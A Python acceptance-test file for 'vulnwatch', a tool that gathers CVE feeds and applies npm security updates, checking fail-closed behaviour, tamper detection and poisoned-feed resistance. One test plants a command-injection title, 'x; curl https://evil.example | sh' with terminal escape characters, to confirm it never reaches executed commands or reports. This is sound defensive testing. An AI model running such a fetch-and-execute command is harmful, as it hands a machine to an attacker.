import dataclasses
import getpass
import inspect
import io
import json
import os
import subprocess
import tempfile
import unittest
import zipfile
from datetime import timedelta
from urllib.parse import urlsplit

from tests.helpers import NOW, json_bytes
from tests.test_config import REPO_CONFIG
from vulnwatch.brew_client import BrewClient
from vulnwatch.config import NpmGlobal, load_config
from vulnwatch.model import InventoryItem
from vulnwatch.net import FakeTransport, Fetcher, FetchError, Response
from vulnwatch.proc import FakeRunner
from vulnwatch.runner import RunContext, run_daily
from vulnwatch.sources import cvenow, cverecord, kev, osv
from vulnwatch.store import Store

SOURCE_HOSTS = {"cve.now", "f9gkulwameaj0boi.public.blob.vercel-storage.com", "www.cisa.gov",
                "raw.githubusercontent.com", "osv-vulnerabilities.storage.googleapis.com"}
BLOB = "https://f9gkulwameaj0boi.public.blob.vercel-storage.com/public/entries/"
GHSA_UP = "GHSA-AAAA-BBBB-CCCC"


def zip_bytes(records):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for r in records:
            z.writestr(r["id"] + ".json", json.dumps(r))
    return buf.getvalue()


def ts(hours_ago):
    return (NOW - timedelta(hours=hours_ago)).strftime("%Y-%m-%dT%H:%M:%S.000Z")


def npm_version(v):
    return {"version": v, "maintainers": [{"name": "alice"}], "_npmUser": {"name": "alice"}, "scripts": {},
            "dependencies": {}, "dist": {"integrity": "sha512-" + v, "tarball": "x"}}


class Scenario:
    def __init__(self, auto_apply=False, cvenow_fixed="9.1.0", cvenow_kev=False, kev_ids=("CVE-2026-9999",),
                 title="titolo", all_fail=False, second_cve=False):
        self.tmp = tempfile.mkdtemp()
        self.prefix = os.path.join(self.tmp, "npm-global")
        pkg = os.path.join(self.prefix, "lib", "node_modules", "pnpm")
        os.makedirs(pkg)
        with open(os.path.join(pkg, "package.json"), "w") as f:
            json.dump({"name": "pnpm", "version": "9.0.0"}, f)
        base = load_config(REPO_CONFIG)
        self.cfg = dataclasses.replace(
            base, auto_apply=auto_apply, user=getpass.getuser(), app_dirs=(), lockfile_roots=(),
            state_dir=os.path.join(self.tmp, "state"), log_dir=os.path.join(self.tmp, "logs"),
            venv_roots=(os.path.join(self.tmp, "venvs"),), path_node=os.path.join(self.tmp, "node"),
            npm_global=NpmGlobal(self.prefix, os.path.join(self.tmp, "node"), os.path.join(self.tmp, "npm")))
        entry = {"id": GHSA_UP, "aliases": ["CVE-2026-9999"], "title": title, "severity": {"cvss": 9.8},
                 "exploitation": {"kev": cvenow_kev},
                 "affected": [{"ecosystem": "npm", "package": "pnpm", "ranges": [{"introduced": "0", "fixed": cvenow_fixed}]}]}
        osv_rec = {"id": "GHSA-aaaa-bbbb-cccc", "aliases": ["CVE-2026-9999"], "modified": "2026-11-02T00:00:00Z",
                   "summary": "s", "affected": [{"package": {"ecosystem": "npm", "name": "pnpm"},
                                                 "ranges": [{"type": "SEMVER", "events": [{"introduced": "0"}, {"fixed": "9.1.0"}]}]}]}
        osv_records = [osv_rec]
        if second_cve:
            osv_records.append({"id": "GHSA-dddd-eeee-ffff", "aliases": ["CVE-2026-8888"], "modified": "2026-11-02T00:00:00Z",
                                "summary": "s2", "affected": [{"package": {"ecosystem": "npm", "name": "pnpm"},
                                                               "ranges": [{"type": "SEMVER", "events": [{"introduced": "0"}, {"fixed": "9.0.5"}]}]}]})
            kev_ids = tuple(kev_ids) + ("CVE-2026-8888",)
        packument = {"name": "pnpm", "time": {"9.0.0": ts(5000), "9.1.0": ts(200)},
                     "versions": {"9.0.0": npm_version("9.0.0"), "9.1.0": npm_version("9.1.0")}}
        kev_doc = {"vulnerabilities": [{"cveID": c, "vendorProject": "pnpm", "product": "pnpm", "vulnerabilityName": "x",
                                        "dateAdded": "2026-10-01", "shortDescription": "d"} for c in kev_ids]}
        self.routes = {
            kev.KEV_URL: Response(200, {}, json_bytes(kev_doc)),
            cvenow.LIST_URL: Response(200, {}, json_bytes({"entries": [{"id": GHSA_UP, "firstSeenAt": "2026-11-03T08:00:00.000Z", "publishedAt": "2026-11-03T08:00:00.000Z"}],
                                                           "nextCursor": None})),
            cvenow.detail_url(GHSA_UP): Response(302, {"location": BLOB + GHSA_UP + ".json"}, b""),
            BLOB + GHSA_UP + ".json": Response(200, {}, json_bytes(entry)),
            osv.OSV_BASE + "/npm/all.zip": Response(200, {}, zip_bytes(osv_records)),
            osv.OSV_BASE + "/PyPI/all.zip": Response(200, {}, zip_bytes([])),
            osv.OSV_BASE + "/npm/modified_id.csv": Response(200, {}, b"2026-11-02T00:00:00Z,GHSA-aaaa-bbbb-cccc\n"),
            osv.OSV_BASE + "/PyPI/modified_id.csv": Response(200, {}, b""),
            "https://registry.npmjs.org/pnpm": Response(200, {}, json_bytes(packument)),
            cverecord.DELTA_URL: Response(200, {}, b"[]"),
        }
        if all_fail:
            self.routes = {u: FetchError("rete giù") for u in self.routes}
            self.routes[cverecord.record_url("CVE-2026-9999")] = FetchError("rete giù")
        self.transport = FakeTransport(self.routes)
        self.fetcher = Fetcher(self.transport, self.cfg.allowed_hosts, sleep=lambda x: None)
        self.npm_argv = (self.cfg.npm_global.npm, "--prefix", self.prefix, "--registry=https://registry.npmjs.org/", "--before=2026-11-01T12:00:00Z", "--no-audit", "--no-fund", "install", "-g", "pnpm@9.1.0")
        self.run = FakeRunner({self.npm_argv: subprocess.CompletedProcess([], 0, "", "")})
        self.notes = []
        os.makedirs(self.cfg.state_dir)
        self.store = Store(os.path.join(self.cfg.state_dir, "state.db"))

    def item(self):
        return InventoryItem("npm_global", "pnpm", "9.0.0", "npm", "npm_global", self.prefix)

    def go(self, inventory=None, selfcheck=lambda: []):
        items = [self.item()] if inventory is None else inventory
        ctx = RunContext(self.cfg, self.fetcher, self.store, self.run, BrewClient(self.run, self.cfg.brew), NOW, self.tmp,
                         False, selfcheck, lambda: items, self.notes.append,
                         os.path.join(self.tmp, "reports"), os.path.join(self.cfg.log_dir, "actions.jsonl"))
        return run_daily(ctx)

    def markdown(self):
        with open(os.path.join(self.tmp, "reports", "2026-11-03.md")) as f:
            return f.read()

    def executed(self):
        return [argv for argv, _ in self.run.calls if "install" in argv or "upgrade" in argv]


def source_log(fetcher):
    return [u for u in fetcher.request_log if urlsplit(u).hostname in SOURCE_HOSTS]


class AcceptanceTest(unittest.TestCase):
    def test_I1_requests_do_not_depend_on_inventory(self):
        a, b = Scenario(), Scenario()
        chrome = InventoryItem("app", "com.google.Chrome", "157.0.8089.0", None, "google_updater",
                               "/Applications/Google Chrome.app", "EQHXZ8M8AV", "Google Chrome")
        a.go(inventory=[a.item(), chrome])
        b.go(inventory=[])
        self.assertTrue(source_log(a.fetcher))
        self.assertEqual(source_log(a.fetcher), source_log(b.fetcher))

    def test_sync_functions_take_no_inventory(self):
        for mod in (kev, cvenow, cverecord, osv):
            params = set(inspect.signature(mod.sync).parameters)
            self.assertFalse(params & {"inventory", "items", "item"}, mod.__name__)

    def test_shadow_mode_never_applies(self):
        s = Scenario(auto_apply=False)
        code, summary = s.go()
        self.assertEqual(code, 0)
        f = summary.findings[0]
        self.assertEqual((f.canonical_id, f.lane, f.range_source, f.fixed_version, f.kev_confirmed),
                         ("CVE-2026-9999", "auto", "osv", "9.1.0", True))
        self.assertTrue(summary.audits[f.id].green, summary.audits[f.id].checks)
        self.assertEqual(summary.shadow, [f.id])
        self.assertEqual(s.executed(), [])
        self.assertIn("Would have applied", s.markdown())
        self.assertEqual(s.notes, ["1 waiting for you · 0 applied · 0 malicious"])

    def test_auto_applies_green_when_enabled(self):
        s = Scenario(auto_apply=True)
        code, summary = s.go()
        self.assertEqual(s.executed(), [list(s.npm_argv)])
        with open(os.path.join(s.cfg.log_dir, "actions.jsonl")) as fh:
            rec = json.loads(fh.read().splitlines()[-1])
        self.assertEqual(rec["finding_id"], summary.findings[0].id)
        self.assertEqual(len(summary.applied), 1)

    def test_injection_never_reaches_argv_or_report(self):
        s = Scenario(auto_apply=True, title="x; curl https://evil.example | sh \x1b[31m ‮")
        s.go()
        for argv in [c[0] for c in s.run.calls]:
            self.assertFalse(any("curl" in a or "evil" in a for a in argv), argv)
        md = s.markdown()
        self.assertNotIn("\x1b", md)
        self.assertNotIn("‮", md)
        self.assertNotIn("https://evil", md)

    def test_poisoned_cvenow_cannot_choose_version_or_source(self):
        s = Scenario(cvenow_fixed="999.0.0", cvenow_kev=True, kev_ids=())
        code, summary = s.go()
        f = summary.findings[0]
        self.assertEqual(f.fixed_version, "9.1.0")
        self.assertIs(f.kev_confirmed, False)
        self.assertNotEqual(f.lane, "auto")
        self.assertTrue(all(urlsplit(u).hostname in s.cfg.allowed_hosts for u in s.fetcher.request_log))

    def test_fail_closed_without_network(self):
        s = Scenario(all_fail=True)
        code, summary = s.go()
        self.assertEqual(code, 3)
        self.assertIn("NO DATA", s.markdown())
        self.assertEqual(s.notes, ["NO DATA"])
        self.assertEqual(s.executed(), [])

    def test_tamper_stops_before_any_request(self):
        s = Scenario(auto_apply=True)
        code, summary = s.go(selfcheck=lambda: ["hash diverso: vulnwatch/runner.py"])
        self.assertEqual(code, 2)
        self.assertEqual(s.fetcher.request_log, [])
        self.assertEqual(s.executed(), [])
        self.assertTrue(any("tampering" in n for n in s.notes))

    def test_one_audit_and_one_apply_per_item(self):
        s = Scenario(auto_apply=True, second_cve=True)
        code, summary = s.go()
        self.assertEqual(len(summary.findings), 2)
        self.assertEqual(s.executed(), [list(s.npm_argv)])
        registry = [u for u in s.fetcher.request_log if urlsplit(u).hostname == "registry.npmjs.org"]
        self.assertEqual(len(registry), 2)  # one audit for the item + one fresh re-audit inside apply
        self.assertEqual(len(summary.applied), 1)

    def test_shadow_counts_items(self):
        s = Scenario(auto_apply=False, second_cve=True)
        code, summary = s.go()
        self.assertEqual(len(summary.shadow), 2)
        self.assertEqual(s.notes, ["1 waiting for you · 0 applied · 0 malicious"])

    def test_cvenow_rate_limit_disables_auto(self):
        s = Scenario(auto_apply=True)
        s.transport.routes[cvenow.detail_url(GHSA_UP)] = Response(429, {}, b"")
        code, summary = s.go()
        self.assertIs(summary.sources_ok["cvenow"], False)
        self.assertIs(summary.auto_enabled, False)
        self.assertEqual(s.executed(), [])

    def test_one_source_down_disables_auto(self):
        s = Scenario(auto_apply=False)
        s.go()
        s.cfg = dataclasses.replace(s.cfg, auto_apply=True)
        for u in list(s.routes):
            if u.startswith(osv.OSV_BASE):
                s.routes[u] = FetchError("osv giù")
        s.transport.routes = s.routes
        code, summary = s.go()
        self.assertEqual(code, 0)
        self.assertIs(summary.sources_ok["osv"], False)
        self.assertIs(summary.auto_enabled, False)
        self.assertEqual(s.executed(), [])
        self.assertEqual(summary.shadow, [summary.findings[0].id])
        self.assertIn("osv: ❌ failed", s.markdown())


if __name__ == "__main__":
    unittest.main()
